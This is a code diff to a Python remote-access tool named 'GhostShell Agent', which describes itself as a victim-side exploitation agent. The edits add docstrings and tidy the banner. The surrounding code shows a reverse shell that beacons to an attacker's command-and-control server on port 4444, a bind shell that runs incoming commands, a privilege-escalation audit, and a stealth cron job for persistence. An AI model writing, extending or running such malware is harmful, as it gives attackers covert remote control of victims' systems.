@@ -1,10 +1,14 @@
+"""
+GhostShell Agent Module
+Victim-side exploitation agent with C2 beaconing, bind shells, and privilege escalation auditing.
+"""
+
 import sys
 import socket
 import subprocess
 import os
 import threading
 import platform
-import argparse
 import time
 
 # --- CONFIGURATION ---
@@ -13,14 +17,17 @@ DEFAULT_PORT = 4444
 XOR_KEY = b"GHOST" 
 
 def print_banner():
-    print(r'''
+    banner = r'''
        __ _ _404_ _ 
       / _` |/ _` |/ _ \'_ \| __|
      | (_| | (_| |  __/ | | | |_
       \__,_|\__, |\___|_| |_|\__|
              __/ |               
             |___/   [Agent v''' + VERSION + r''']
-    ''')
+    '''
+    print(banner)
+
+
 
 # --- UTILITIES ---
 
@@ -62,6 +69,7 @@ def execute_command(cmd):
 # --- MODULES ---
 
 def reverse_shell(ip, port):
+    """Initiates reverse shell to attacker's C2 server."""
     while True:
         print(f"[*] Connecting to {ip}:{port}...")
         try:
@@ -106,7 +114,7 @@ def reverse_shell(ip, port):
             time.sleep(5)
 
 def bind_shell(port):
-    """Listens for incoming connections."""
+    """Listens for incoming connections and executes commands."""
     def handle_client(client_socket):
         try:
             # V2: Cleartext Banner
@@ -149,6 +157,7 @@ def bind_shell(port):
         if server: server.close()
 
 def audit_system():
+    """Performs privilege escalation vulnerability audit."""
     print("\n=== PRIVILEGE ESCALATION AUDIT ===")
     
     # 1. Basic Info
@@ -211,7 +220,7 @@ def audit_system():
     print("\n=== AUDIT COMPLETE ===")
 
 def persist_access(payload):
-    """Adds a stealth cron job."""
+    """Adds a stealth cron job for persistence."""
     try:
         current_script = os.path.abspath(sys.argv[0])
         python_exe = sys.executable
